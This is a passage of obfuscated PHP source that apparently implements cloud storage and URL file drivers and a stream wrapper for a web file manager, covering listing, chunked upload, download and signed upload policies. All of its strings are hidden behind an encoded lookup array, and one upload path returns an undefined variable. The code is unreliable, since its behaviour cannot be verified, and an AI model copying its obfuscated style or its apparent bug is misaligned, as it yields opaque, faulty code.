$ÜõçíïÛ[$¨Ì®•ÖŞ[76]] = $‰…ïñ[$¨Ì®•ÖŞ[76]]; return $ÜõçíïÛ; } public function folderInfo($ùòĞ“ìœ, $˜¹·êô° = false) { $ÍÄÒÊ³ü =& $_SERVER[Îûáû“ş]; $ä±·‡š· = array($ÍÄÒÊ³ü[32] => $this->pathThis($ùòĞ“ìœ), $ÍÄÒÊ³ü[84] => $this->getPathOuter($ÍÄÒÊ³ü[8] . $ùòĞ“ìœ), $ÍÄÒÊ³ü[33] => $ÍÄÒÊ³ü[75]); if ($˜¹·êô°) { return $ä±·‡š·; } $ä±·‡š·[$ÍÄÒÊ³ü[201]] = $ä±·‡š·[$ÍÄÒÊ³ü[85]] = 0; $ä±·‡š·[$ÍÄÒÊ³ü[202]] = $ä±·‡š·[$ÍÄÒÊ³ü[203]] = !0; if (empty($ŸÂİõë”)) { $ŸÂİõë” = $this->objectMeta($ùòĞ“ìœ); if (!$ŸÂİõë”) { return $ä±·‡š·; } } $ä±·‡š·[$ÍÄÒÊ³ü[201]] = intval($ŸÂİõë”[$ÍÄÒÊ³ü[1478]]); $ä±·‡š·[$ÍÄÒÊ³ü[85]] = intval($ŸÂİõë”[$ÍÄÒÊ³ü[1479]]); return $ä±·‡š·; } private function listObjs($Â‚Ù—Ü, $†¯ÖûÌ­ = 0, $€Ğ›ìÅ = 1000) { $Ñ £Æ‚¡ =& $_SERVER[Îûáû“ş]; $û±ï·ìİ = array($Ñ £Æ‚¡[1480], $Ñ £Æ‚¡[1481] . $€Ğ›ìÅ); if ($†¯ÖûÌ­) { $û±ï·ìİ[] = $Ñ £Æ‚¡[1482] . $†¯ÖûÌ­; } $¶–ô‡Óß = $this->ussRequest($Â‚Ù—Ü, $Ñ £Æ‚¡[230], !1, $û±ï·ìİ); return !$¶–ô‡Óß[$Ñ £Æ‚¡[1214]] ? !1 : $¶–ô‡Óß[$Ñ £Æ‚¡[1204]]; } private function fileList($ÖªáÖ¯, &$½È¼Ò×¥, &$Ş¼Çƒæ, $«ôøùíœ = false) { $ƒè¶×à¶ =& $_SERVER[Îûáû“ş]; $“†Øî½ = $ƒè¶×à¶[12]; $»‘¿å…ö = 1000; $ôâÌú¥ = rtrim($ÖªáÖ¯, $ƒè¶×à¶[8]) . $ƒè¶×à¶[8]; while (!0) { check_abort(); $È¡—€ş™ = $this->listObjs($ÖªáÖ¯, $“†Øî½, $»‘¿å…ö); if (!$È¡—€ş™) { return !1; } $“†Øî½ = isset($È¡—€ş™[$ƒè¶×à¶[1483]]) ? $È¡—€ş™[$ƒè¶×à¶[1483]] : $ƒè¶×à¶[12]; $ïÓ¶Ò÷‰ = isset($È¡—€ş™[$ƒè¶×à¶[1484]]) ? $È¡—€ş™[$ƒè¶×à¶[1484]] : array(); foreach ($ïÓ¶Ò÷‰ as $ÈäµÅò ) { $¢†åÀğ© = $ÈäµÅò [$ƒè¶×à¶[33]] == $ƒè¶×à¶[75] ? !0 : !1; $Ç‡„¾®ó = ltrim($ôâÌú¥ . $ÈäµÅò [$ƒè¶×à¶[32]], $ƒè¶×à¶[8]) . ($¢†åÀğ© ? $ƒè¶×à¶[8] : $ƒè¶×à¶[12]); $›¬Ù†œæ = array($ƒè¶×à¶[32] => $Ç‡„¾®ó, $ƒè¶×à¶[33] => $¢†åÀğ© ? $ƒè¶×à¶[75] : $ƒè¶×à¶[200], $ƒè¶×à¶[76] => $ÈäµÅò [$ƒè¶×à¶[337]], $ƒè¶×à¶[1479] => $ÈäµÅò [$ƒè¶×à¶[1485]]); $this->cacheMethodInfoSet($Ç‡„¾®ó, $¢†åÀğ©, $›¬Ù†œæ); if ($¢†åÀğ©) { $½È¼Ò×¥[] = $Ç‡„¾®ó; if ($«ôøùíœ) { $this->fileList($Ç‡„¾®ó, $½È¼Ò×¥, $Ş¼Çƒæ, $«ôøùíœ); } continue; } $Ş¼Çƒæ[] = $›¬Ù†œæ; } if (count($ïÓ¶Ò÷‰) < $»‘¿å…ö) { break; } } $this->cacheMethodInfoSet($ÖªáÖ¯, !0); } public function listPath($”»ˆƒÉæ, $¿‘ª“ªğ = false) { $ş€º¸¸ =& $_SERVER[Îûáû“ş]; $šèŸ³›‚ = $±îÆÚíê = array(); $this->fileList($”»ˆƒÉæ, $šèŸ³›‚, $±îÆÚíê); foreach ($šèŸ³›‚ as $òüÍÃÁó => $ùÍ‚Á—) { $šèŸ³›‚[$òüÍÃÁó] = $this->folderInfo($ùÍ‚Á—, $¿‘ª“ªğ); } foreach ($±îÆÚíê as $òüÍÃÁó => $ùÍ‚Á—) { $±îÆÚíê[$òüÍÃÁó] = $this->fileInfo($ùÍ‚Á—[$ş€º¸¸[32]], $¿‘ª“ªğ, $ùÍ‚Á—); } return array($ş€º¸¸[82] => $šèŸ³›‚, $ş€º¸¸[83] => $±îÆÚíê); } public function has($ÁÀÇÖØ, $›÷óš… = false, $ªº­ë¸¢ = true) { $„¦¶ªå =& $_SERVER[Îûáû“ş]; $ü´Èïø¡ = $„¦¶ªå[12]; $Îœ’’ÔÑ = 500; $£”Ğ§“¾ = 0; $ƒ½½¸˜€ = 0; $ŠîÈ¼Ä® = rtrim($ÁÀÇÖØ, $„¦¶ªå[8]) . $„¦¶ªå[8]; while (!0) { check_abort(); $İïŠ„ = $this->listObjs($ÁÀÇÖØ, $ü´Èïø¡, $Îœ’’ÔÑ); if (!$İïŠ„) { return !1; } $ü´Èïø¡ = isset($İïŠ„[$„¦¶ªå[1483]]) ? $İïŠ„[$„¦¶ªå[1483]] : $„¦¶ªå[12]; $ÛóßÁ¿¶ = isset($İïŠ„[$„¦¶ªå[1484]]) ? $İïŠ„[$„¦¶ªå[1484]] : array(); if (empty($ÛóßÁ¿¶)) { break; } $èÀŸ²“Ú = array_filter($ÛóßÁ¿¶, function ($Ê­ó§•Ş) { $µ œ˜¨ù =& $_SERVER[Îûáû“ş]; return $Ê­ó§•Ş[$µ œ˜¨ù[33]] == $µ œ˜¨ù[75]; }); $ ¨êü›ş = count($ÛóßÁ¿¶); $èÀŸ²“Ú = count($èÀŸ²“Ú); $Æ¼„îæó = $ ¨êü›ş - $èÀŸ²“Ú; if ($›÷óš…) { $ƒ½½¸˜€ += $èÀŸ²“Ú; $£”Ğ§“¾ += $Æ¼„îæó; if ($ ¨êü›ş < $Îœ’’ÔÑ) { break; } continue; } if ($ªº­ë¸¢) { if ($Æ¼„îæó) { return !0; } } else { if ($èÀŸ²“Ú) { return !0; } } if ($ ¨êü›ş < $Îœ’’ÔÑ) { break; } } if ($›÷óš…) { return array($„¦¶ªå[207] => $£”Ğ§“¾, $„¦¶ªå[208] => $ƒ½½¸˜€); } return !1; } public function listAll($Ñıîïí) { $ã¸Âò€´ =& $_SERVER[Îûáû“ş]; $’£¹ûÎş = $ÏÃ‚Ôà = array(); $this->fileList($Ñıîïí, $’£¹ûÎş, $ÏÃ‚Ôà, !0); $õ–Ù–ö• = array_to_keyvalue($ÏÃ‚Ôà, $ã¸Âò€´[32]); foreach ($’£¹ûÎş as $ß¸â« ï) { if (is_string($ß¸â« ï)) { $õ–Ù–ö•[$ß¸â« ï] = array($ã¸Âò€´[76] => 0); } } return $this->listAllFiles($Ñıîïí, $õ–Ù–ö•); } public function canRead($Ó–™ ã) { return $this->exist($Ó–™ ã) ? !0 : !1; } public function canWrite($¥Ğâ÷ÜÛ) { return $this->exist($¥Ğâ÷ÜÛ) ? !0 : !1; } public function getContent($±¾¶‰óÓ) { return $this->fileSubstr($±¾¶‰óÓ, 0, -1); } public function setContent($êÉ ÏØõ, $…Í‹Ç”± = '') { $Ùµ­Øå§ =& $_SERVER[Îûáû“ş]; if (!$…Í‹Ç”±) { $óÏ±¨êö = $this->ussRequest($êÉ ÏØõ, $Ùµ­Øå§[226]); return $óÏ±¨êö[$Ùµ­Øå§[1214]]; } $ï‹Ûšµ = $this->tempFile($this->pathThis($êÉ ÏØõ)); file_put_contents($ï‹Ûšµ, $…Í‹Ç”±); if ($this->upload($êÉ ÏØõ, $ï‹Ûšµ)) { $this->tempFileRemve($ï‹Ûšµ); return !0; } return !1; } public function fileSubstr($ú•ëµ–Ş, $é·ç³éî, $™à™ûïÇ) { $³‡ØÇ–š =& $_SERVER[Îûáû“ş]; if (!($È‹ìÔ¡… = $this->link($ú•ëµ–Ş))) { return !1; } $“°„à¾¯ = !1; if ($™à™ûïÇ > 0) { $öºòÉü = $é·ç³éî + $™à™ûïÇ - 1; $“°„à¾¯ = array($³‡ØÇ–š[1446] . $é·ç³éî . $³‡ØÇ–š[386] . $öºòÉü); } $Ûåç¨Î– = url_request($È‹ìÔ¡…, $³‡ØÇ–š[230], !1, $“°„à¾¯); return $Ûåç¨Î–[$³‡ØÇ–š[748]] ? $Ûåç¨Î–[$³‡ØÇ–š[1204]] : !1; } public function upload($Àù³‰Ïà, $ğÎ¶«, $Ñ¹ÛÙ©¹ = false, $ˆ§å¸„™ = REPEAT_REPLACE) { $šëÉ§¤Ê =& $_SERVER[Îûáû“ş]; $„çŞºÖ¢ = IO::size($ğÎ¶«); if ($„çŞºÖ¢ <= 1024 * 1024 * 200) { $©Ë×„Ô¢ = array($šëÉ§¤Ê[1486] . $ğÎ¶«); $×²›†› = $this->ussRequest($Àù³‰Ïà, $šëÉ§¤Ê[228], $©Ë×„Ô¢); return $×²›†›[$šëÉ§¤Ê[1214]] ? $this->getPathOuter($Àù³‰Ïà) : !1; } $Šš¾şè = 1024 * 1024 * 10; $ÀÜ¸ãØ = array($šëÉ§¤Ê[1487], $šëÉ§¤Ê[1488] . $„çŞºÖ¢, $šëÉ§¤Ê[1489], $šëÉ§¤Ê[1490] . $Šš¾şè); $×²›†› = $this->ussRequest($Àù³‰Ïà, $šëÉ§¤Ê[228], !1, $ÀÜ¸ãØ); if (!$×²›†›[$šëÉ§¤Ê[1214]]) { return !1; } $¯¶Â«§„ = $×²›†›[$šëÉ§¤Ê[1204]]; $’ú‚îÑ = 0; $ğàÑµİ¼ = $¯¶Â«§„[$šëÉ§¤Ê[1491]]; $ßíßªÌà = fopen($ğÎ¶«, $šëÉ§¤Ê[1395]); if (!$ßíßªÌà) { return !1; } do { $õ‰‡æ = $¯¶Â«§„[$šëÉ§¤Ê[1492]]; fseek_64($ßíßªÌà, $’ú‚îÑ); $˜éûà® = fread($ßíßªÌà, $õ‰‡æ); $«ş×”Ç¡ = 0; do { $«ş×”Ç¡++; $¯¶Â«§„ = $this->uploadPart($Àù³‰Ïà, $¯¶Â«§„, $˜éûà®); } while (!$¯¶Â«§„ && $«ş×”Ç¡ < 3); if (!$¯¶Â«§„) { return !1; } $ğàÑµİ¼ = $¯¶Â«§„[$šëÉ§¤Ê[1491]]; $’ú‚îÑ += $õ‰‡æ; } while ($ğàÑµİ¼ != -1); fclose($ßíßªÌà); $ÀÜ¸ãØ = array($šëÉ§¤Ê[1493], $šëÉ§¤Ê[1494] . $¯¶Â«§„[$šëÉ§¤Ê[1495]], $šëÉ§¤Ê[1489]); $×²›†› = $this->ussRequest($Àù³‰Ïà, $šëÉ§¤Ê[228], !1, $ÀÜ¸ãØ); return $×²›†›[$šëÉ§¤Ê[1214]] ? $this->getPathOuter($¥…Ş˜ÉÅ) : !1; } private function uploadPart($¤¢Ğ‚¾², $‰ñ¢Ìâ¯, &$†´Ä‚éé) { $•ßÂĞıÖ =& $_SERVER[Îûáû“ş]; $ì¹âîÔ„ = array($•ßÂĞıÖ[1496], $•ßÂĞıÖ[1494] . $‰ñ¢Ìâ¯[$•ßÂĞıÖ[1495]], $•ßÂĞıÖ[1497] . $‰ñ¢Ìâ¯[$•ßÂĞıÖ[1491]], $•ßÂĞıÖ[142] . $‰ñ¢Ìâ¯[$•ßÂĞıÖ[1492]]); $ÆÆÖ¾ÆÁ = $this->ussRequest($¤¢Ğ‚¾², $•ßÂĞıÖ[228], $†´Ä‚éé, $ì¹âîÔ„); return !$ÆÆÖ¾ÆÁ[$•ßÂĞıÖ[1214]] ? $ÆÆÖ¾ÆÁ[$•ßÂĞıÖ[1214]] : $ÆÆÖ¾ÆÁ[$•ßÂĞıÖ[1204]]; } public function uploadFormData($‹ääÙ¾õ, $ÎŒÔŒºà = 3600) { return $this->uploadPolicy($‹ääÙ¾õ, $ÎŒÔŒºà); } public function multiUploadFormData($î¾Éâ¿Ê, $Àªğ¿ë = 3600) { $ùËõñÂ² =& $_SERVER[Îûáû“ş]; $Òß‘ş¡ = (int) $GLOBALS[$ùËõñÂ²[7]][$ùËõñÂ²[76]]; return $this->uploadPolicy($î¾Éâ¿Ê, $Àªğ¿ë, $Òß‘ş¡); } private function uploadPolicy($ı©Ÿ¹¹³, $ş×–ß¥ = 3600, $¥Èë•Ò” = 0) { $ìÕ¹”ƒª =& $_SERVER[Îûáû“ş]; $çìãË®œ = $ìÕ¹”ƒª[8] . $this->bucket; $ù°à› = gmdate($ìÕ¹”ƒª[1431]); $ç¬Ó¶¤Î = array($ìÕ¹”ƒª[1498] => $this->bucket, $ìÕ¹”ƒª[1499] => $ı©Ÿ¹¹³, $ìÕ¹”ƒª[1500] => time() + $ş×–ß¥, $ìÕ¹”ƒª[1501] => $ù°à›); if ($¥Èë•Ò”) { $ç¬Ó¶¤Î[$ìÕ¹”ƒª[1411]] = $¥Èë•Ò”; } $¨Ë›åßÅ = base64_encode(json_encode($ç¬Ó¶¤Î)); $ëÎìÇáÂ = base64_encode(hash_hmac($ìÕ¹”ƒª[1468], "\120\117\123\124\46{$çìãË®œ}\46{$ù°à›}\46{$¨Ë›åßÅ}", md5("{$this->userpass}"), !0)); $†ĞÜ‡Š¬ = array($ìÕ¹”ƒª[1336] => $¨Ë›åßÅ, $ìÕ¹”ƒª[1502] => "\125\120\x59\125\x4e\x20{$this->username}\72{$ëÎìÇáÂ}", $ìÕ¹”ƒª[182] => $this->endpoint . $çìãË®œ); return $†ĞÜ‡Š¬; } public function download($‰ó·êÇÌ, $ÖêŠâ¨œ) { $ØàÃ£´Ò = IO::getPathInner(IO::mkfile($ÖêŠâ¨œ)); if (!($‚˜•÷Ò  = $this->link($‰ó·êÇÌ))) { return !1; } $”İä«â = 0; $çàûôÏ¦ = 1024 * 200; $Ÿå´ğôÕ = fopen($ØàÃ£´Ò, $_SERVER[Îûáû“ş][1452]); while (!0) { $²ğ®µü¢ = $this->fileSubstr($‰ó·êÇÌ, $”İä«â, $çàûôÏ¦); if ($²ğ®µü¢ === !1) { return !1; } fwrite($Ÿå´ğôÕ, $²ğ®µü¢); $”İä«â += $çàûôÏ¦; if (strlen($²ğ®µü¢) < $çàûôÏ¦) { break; } } fclose($Ÿå´ğôÕ); return $ÖêŠâ¨œ; } public function link($íõÕìç†, $¢Ê×ê‚Ç = array()) { $İË¶°ïâ =& $_SERVER[Îûáû“ş]; $íõÕìç† = trim($íõÕìç†, $İË¶°ïâ[8]); if (!empty($this->token)) { $¾‡Å•”Ã = strtotime(date($İË¶°ïâ[1503])); $‡¡Æ²Øµ = substr(md5($this->token . $İË¶°ïâ[284] . $¾‡Å•”Ã . $İË¶°ïâ[1504] . $íõÕìç†), 12, 8) . $¾‡Å•”Ã; $¢Ê×ê‚Ç[] = $İË¶°ïâ[1505] . $‡¡Æ²Øµ; } $‡äŠºù = !empty($¢Ê×ê‚Ç) ? $İË¶°ïâ[73] . implode($İË¶°ïâ[284], $¢Ê×ê‚Ç) : $İË¶°ïâ[12]; return $this->getHost() . $İË¶°ïâ[8] . $íõÕìç† . $‡äŠºù; } public function fileOut($Ó†×•œû, $Á¤‰ğ = false, $Ü”–«¢Ï = false, $ß·Ò¼²½ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ó†×•œû, $Á¤‰ğ, $Ü”–«¢Ï, $ß·Ò¼²½); } if (!$Ü”–«¢Ï) { $Ü”–«¢Ï = $this->pathThis($Ó†×•œû); } $É¢„š…œ = $Á¤‰ğ ? array($_SERVER[Îûáû“ş][1506] . rawurlencode($Ü”–«¢Ï)) : array(); $½æô° = $this->link($Ó†×•œû, $É¢„š…œ); $this->fileOutLink($½æô°); } public function fileOutServer($îªòıñŸ, $Ğœ”ùâö = false, $¹ş¬Ñ‡ô = false, $É‡¹Ñå = '') { parent::fileOut($îªòıñŸ, $Ğœ”ùâö, $¹ş¬Ñ‡ô, $É‡¹Ñå); } public function fileOutImage($Ğ§à€, $Š®¡ŒŒ‰ = 250) { $§¤‘íÖ = $this->link($Ğ§à€ . $_SERVER[Îûáû“ş][1507] . $Š®¡ŒŒ‰); $this->fileOutLink($§¤‘íÖ); } public function fileOutImageServer($éıËó¾, $âğÎú©ã = 250) { parent::fileOutImage($éıËó¾, $âğÎú©ã); } public function hashMd5($É„–ƒä) { $Ä‹ïëâ¤ =& $_SERVER[Îûáû“ş]; $¯­ÚÓ·¦ = $this->_objectMeta($É„–ƒä); return isset($¯­ÚÓ·¦[$Ä‹ïëâ¤[212]]) ? $¯­ÚÓ·¦[$Ä‹ïëâ¤[212]] : !1; } public function size($‰ôâíà·) { $˜âã¨ù… = $this->objectMeta($‰ôâíà·); return $˜âã¨ù… ? $˜âã¨ù…[$_SERVER[Îûáû“ş][76]] : 0; } public function info($ï£ûûö¥) { if ($this->isFolder($ï£ûûö¥)) { return $this->folderInfo($ï£ûûö¥); } else { if ($this->isFile($ï£ûûö¥)) { return $this->fileInfo($ï£ûûö¥); } } return !1; } public function exist($ÔÈÊÉŸ²) { return $this->isFile($ÔÈÊÉŸ²) || $this->isFolder($ÔÈÊÉŸ²); } public function isFile($‚²…òñÒ) { return !$this->isFolder($‚²…òñÒ) && $this->objectMeta($‚²…òñÒ); } public function isFolder($ÉÌÖ Èİ) { return $this->cacheMethod($_SERVER[Îûáû“ş][165], $ÉÌÖ Èİ); } protected function objectMeta($ï¢”ªÖú) { return $this->cacheMethod($_SERVER[Îûáû“ş][167], $ï¢”ªÖú); } protected function _objectMeta($ÚäÏËş½) { $³”ş» =& $_SERVER[Îûáû“ş]; if ($ÚäÏËş½ == $³”ş»[12] || $ÚäÏËş½ == $³”ş»[8]) { return array(); } $¼Ëñ¢ğ“ = $this->ussRequest($ÚäÏËş½, $³”ş»[1508]); if (!$¼Ëñ¢ğ“[$³”ş»[1214]]) { return null; } $ºÙÕş÷¹ = isset($¼Ëñ¢ğ“[$³”ş»[1204]]) ? $¼Ëñ¢ğ“[$³”ş»[1204]] : array(); if (!isset($ºÙÕş÷¹[$³”ş»[1509]])) { return null; } $õ‡¬ÌÀÀ = array($³”ş»[33] => isset($ºÙÕş÷¹[$³”ş»[1509]]) ? $ºÙÕş÷¹[$³”ş»[1509]] : null, $³”ş»[76] => isset($ºÙÕş÷¹[$³”ş»[1510]]) ? $ºÙÕş÷¹[$³”ş»[1510]] : null, $³”ş»[212] => isset($ºÙÕş÷¹[$³”ş»[1511]]) ? $ºÙÕş÷¹[$³”ş»[1511]] : null, $³”ş»[1478] => isset($ºÙÕş÷¹[$³”ş»[1512]]) ? $ºÙÕş÷¹[$³”ş»[1512]] : null); $õ‡¬ÌÀÀ[$³”ş»[1479]] = isset($ºÙÕş÷¹[$³”ş»[1513]]) ? strtotime($ºÙÕş÷¹[$³”ş»[1513]]) : $õ‡¬ÌÀÀ[$³”ş»[1478]]; return $õ‡¬ÌÀÀ; } protected function _isFolder($ÍŠà„Œ) { $Öí•¦”Ö =& $_SERVER[Îûáû“ş]; if ($ÍŠà„Œ == $Öí•¦”Ö[12] || $ÍŠà„Œ == $Öí•¦”Ö[8]) { return !0; } $†“Ø›·š = $this->_objectMeta($ÍŠà„Œ); return isset($†“Ø›·š[$Öí•¦”Ö[33]]) && $†“Ø›·š[$Öí•¦”Ö[33]] == $Öí•¦”Ö[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($»ÖÕõğ» = false) { } public function exist($òö¢É˜Ò) { $”¹úŠ½† = $this->info($òö¢É˜Ò); return $”¹úŠ½†[$_SERVER[Îûáû“ş][202]]; } public function isFile($´¤‹Ø‰Š) { $åÇĞ†ç = $this->info($´¤‹Ø‰Š); return $åÇĞ†ç[$_SERVER[Îûáû“ş][202]]; } public function isFolder($‰¬÷–‹») { return !1; } public function size($äá·ü˜) { $°´ìƒƒ = $this->info($äá·ü˜); return $°´ìƒƒ[$_SERVER[Îûáû“ş][76]]; } public function info($öÆëÎñ©) { return $this->infoParse($öÆëÎñ©); } public function infoAuth($—Õ•à‰¤) { return $this->infoParse($—Õ•à‰¤); } public function infoWithChildren($ ¨Ú÷ˆ¿) { return $this->infoParse($ ¨Ú÷ˆ¿); } public function infoFull($’²“¯‰˜) { return $this->infoParse($’²“¯‰˜); } private function infoParse($Ş¸Â³·°) { $…¢‹ûâ =& $_SERVER[Îûáû“ş]; $³ÒÛÎİÌ = $this->header($Ş¸Â³·°); if (!$³ÒÛÎİÌ || !$³ÒÛÎİÌ[$…¢‹ûâ[748]]) { return !1; } $‰»ŠîÑ = _get($³ÒÛÎİÌ, $…¢‹ûâ[337], 0); $õÍË¹â† = array($…¢‹ûâ[32] => $³ÒÛÎİÌ[$…¢‹ûâ[32]], $…¢‹ûâ[84] => $Ş¸Â³·°, $…¢‹ûâ[33] => $…¢‹ûâ[200], $…¢‹ûâ[76] => intval($‰»ŠîÑ), $…¢‹ûâ[174] => get_path_ext($³ÒÛÎİÌ[$…¢‹ûâ[32]]), $…¢‹ûâ[1392] => $‰»ŠîÑ > 0 && $³ÒÛÎİÌ[$…¢‹ûâ[1514]], $…¢‹ûâ[1393] => !1); return $õÍË¹â†; } private function header($³´¨ùÅ´) { $Ù¥½ƒĞ™ =& $_SERVER[Îûáû“ş]; if (isset(self::$_cacheHeader[$³´¨ùÅ´])) { return self::$_cacheHeader[$³´¨ùÅ´]; } $üƒ˜¬“ = isset($GLOBALS[$Ù¥½ƒĞ™[1515]]) ? $GLOBALS[$Ù¥½ƒĞ™[1515]] : !1; $GLOBALS[$Ù¥½ƒĞ™[1515]] = !0; self::$_cacheHeader[$³´¨ùÅ´] = url_header($³´¨ùÅ´); $GLOBALS[$Ù¥½ƒĞ™[1515]] = $üƒ˜¬“; return self::$_cacheHeader[$³´¨ùÅ´]; } public function hashSimple($•Ì„¼ëé, $éÎÂú†˜ = false) { $èñ”Ëëº =& $_SERVER[Îûáû“ş]; $àäÕŠµİ = $this->info($•Ì„¼ëé); if (!$àäÕŠµİ || !$àäÕŠµİ[$èñ”Ëëº[202]]) { return !1; } $‹€û‡æÔ = $àäÕŠµİ[$èñ”Ëëº[76]]; $Ìµ³ä› = 200; $ÇüÃÎ‹ = 50; if ($‹€û‡æÔ <= $Ìµ³ä› * $ÇüÃÎ‹) { return md5($this->fileSubstr($•Ì„¼ëé, 0, $‹€û‡æÔ)) . $‹€û‡æÔ; } $±·ª—‚î = intval($‹€û‡æÔ / $ÇüÃÎ‹); $Ç’À§†¹ = $èñ”Ëëº[12]; $äñåËüÇ = timeFloat(); $ø¢‘Èş = 15; for ($šÀÃ¹–€ = 0; $šÀÃ¹–€ < $ÇüÃÎ‹; $šÀÃ¹–€++) { if (timeFloat() - $äñåËüÇ > $ø¢‘Èş) { return !1; } $ñ¿í±Ó = $this->fileSubstr($•Ì„¼ëé, $±·ª—‚î * $šÀÃ¹–€, $Ìµ³ä›); if (!$ñ¿í±Ó) { return !1; } $Ç’À§†¹ .= $ñ¿í±Ó; } $Ç’À§†¹ .= $this->fileSubstr($•Ì„¼ëé, $‹€û‡æÔ - $Ìµ³ä›, $Ìµ³ä›); return md5($Ç’À§†¹) . $‹€û‡æÔ; } public function getContent($È™˜˜éœ) { return $this->fileSubstr($È™˜˜éœ); } public function fileSubstr($§Í®ÌÊ, $Ş§Àáğñ = 0, $ë—ªãã« = -1) { $¨½ÑÙçú =& $_SERVER[Îûáû“ş]; $‰Ï±ë µ = $this->info($§Í®ÌÊ); if (!$‰Ï±ë µ || !$‰Ï±ë µ[$¨½ÑÙçú[202]] && $‰Ï±ë µ[$¨½ÑÙçú[76]] > 1024 * 1024 * 10) { return !1; } if ($ë—ªãã« === -1) { $ë—ªãã« = $‰Ï±ë µ[$¨½ÑÙçú[76]]; } if ($ë—ªãã« == 0) { return $¨½ÑÙçú[12]; } $¥è‰³¨î = array($¨½ÑÙçú[1516] . $Ş§Àáğñ . $¨½ÑÙçú[781] . ($Ş§Àáğñ + $ë—ªãã« - 1)); $Òêœò¦ = url_request($§Í®ÌÊ, $¨½ÑÙçú[230], !1, $¥è‰³¨î, !1, !1, 30); return $Òêœò¦[$¨½ÑÙçú[1204]] ? $Òêœò¦[$¨½ÑÙçú[1204]] : $¨½ÑÙçú[12]; } public function download($Çª…ùçš, $±º¡ıúû) { Downloader::start($Çª…ùçš, $±º¡ıúû); return $±º¡ıúû; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($©õºÍÙã, $˜Ë³±ñÔ = '') { $this->info = $this->info($©õºÍÙã); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Îûáû“ş][84]]; $this->pathOpen = $©õºÍÙã; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$©õºÍÙã])) { self::$_chunkBuffer[$©õºÍÙã] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($§¦“—êĞ) { $ãß‚—İŒ = $this->fileSubstr($this->pose, $§¦“—êĞ); $this->pose += strlen($ãß‚—İŒ); return $ãß‚—İŒ; } public function stream_tell() { return $this->pose; } public function stream_seek($¶ˆÈõúŸ, $€Ò‰­É¬) { $×¸¤ÔÜİ =& $_SERVER[Îûáû“ş]; if ($€Ò‰­É¬ == SEEK_SET) { $this->pose = $¶ˆÈõúŸ; } else { if ($€Ò‰­É¬ == SEEK_CUR) { $this->pose += $¶ˆÈõúŸ; } else { if ($€Ò‰­É¬ == SEEK_END) { $this->pose = $this->info[$×¸¤ÔÜİ[76]] + intval($¶ˆÈõúŸ); } } } if ($¶ˆÈõúŸ < 0) { $this->pose = $this->info[$×¸¤ÔÜİ[76]] + $¶ˆÈõúŸ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Îûáû“ş][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($êÌ’ö„, $Æ¯Î¬Ğ) { $¢åüı‚‚ =& $_SERVER[Îûáû“ş]; $ÍÜı†–‡ = $this->info($êÌ’ö„); return array($¢åüı‚‚[1517] => 0, $¢åüı‚‚[1518] => 0, $¢åüı‚‚[16] => 32768 + 511, $¢åüı‚‚[1519] => 0, $¢åüı‚‚[1520] => 0, $¢åüı‚‚[1521] => 0, $¢åüı‚‚[1522] => 0, $¢åüı‚‚[76] => $ÍÜı†–‡[$¢åüı‚‚[76]], $¢åüı‚‚[1523] => $ÍÜı†–‡[$¢åüı‚‚[1391]], $¢åüı‚‚[1479] => $ÍÜı†–‡[$¢åüı‚‚[85]], $¢åüı‚‚[1478] => $ÍÜı†–‡[$¢åüı‚‚[201]], $¢åüı‚‚[1524] => 0, $¢åüı‚‚[1525] => 0); } static $fileInfo = array(); public function info($Ëåıä) { $¦›ÛÄÓ = $_SERVER[Îûáû“ş][1526]; if (isset(self::$fileInfo[$Ëåıä])) { return self::$fileInfo[$Ëåıä]; } if (substr($Ëåıä, 0, strlen($¦›ÛÄÓ)) != $¦›ÛÄÓ) { return !1; } self::$fileInfo[$Ëåıä] = IO::info(substr($Ëåıä, strlen($¦›ÛÄÓ))); return self::$fileInfo[$Ëåıä]; } public static function read($¾Ñà´‹¾, $Ó²«¶£ù, $¿“ˆêğğ) { if (!isset(self::$_fopenCache[$¾Ñà´‹¾])) { $÷ÔïÖ–† = new StreamWrapperIO(); $÷ÔïÖ–†->stream_open($¾Ñà´‹¾); self::$_fopenCache[$¾Ñà´‹¾] = $÷ÔïÖ–†; } $÷ÔïÖ–† = self::$_fopenCache[$¾Ñà´‹¾]; return $÷ÔïÖ–†->fileSubstr($Ó²«¶£ù, $¿“ˆêğğ); } public static function _read($ü¢ïøÌğ, $Ó’§ßâË, $¢›êì”©) { $Œ—¥»¦– =& $_SERVER[Îûáû“ş]; $“ä§¡´Ø = fopen($ü¢ïøÌğ, $Œ—¥»¦–[1395]); if (!$“ä§¡´Ø) { return $Œ—¥»¦–[12]; } $ÖòÏ•† = 8192; fseek($“ä§¡´Ø, $Ó’§ßâË, SEEK_SET); $ÔËûôİ = $Œ—¥»¦–[12]; $éÚˆûÈ— = 0; while ($éÚˆûÈ— < $¢›êì”©) { $Œâ™°Æ¯ = min($ÖòÏ•†, $¢›êì”© - $éÚˆûÈ—); $ÔËûôİ .= fread($“ä§¡´Ø, $Œâ™°Æ¯); $éÚˆûÈ— += $Œâ™°Æ¯; } fclose($“ä§¡´Ø); return $ÔËûôİ; } public function fileSubstr($ĞœÄ¹¾, $šû½ªñ) { $ÉË¸Œ’Ì =& $_SERVER[Îûáû“ş]; $›ãåõô• = $this->info[$ÉË¸Œ’Ì[76]]; $»îˆ¤³ì = $ĞœÄ¹¾; $ÏŞ»­‚  = $šû½ªñ; if ($ĞœÄ¹¾ < 0) { $ĞœÄ¹¾ = $›ãåõô• + $ĞœÄ¹¾; } if ($šû½ªñ === !1) { $šû½ªñ = $›ãåõô• - $ĞœÄ¹¾; } if ($ĞœÄ¹¾ + $šû½ªñ > $›ãåõô•) { $šû½ªñ = $›ãåõô• - $ĞœÄ¹¾; } if ($šû½ªñ <= 0) { return $ÉË¸Œ’Ì[12]; } if ($ĞœÄ¹¾ < 0 || $ĞœÄ¹¾ >= $›ãåõô• || $šû½ªñ <= 0 || $šû½ªñ > 1024 * 1024 * 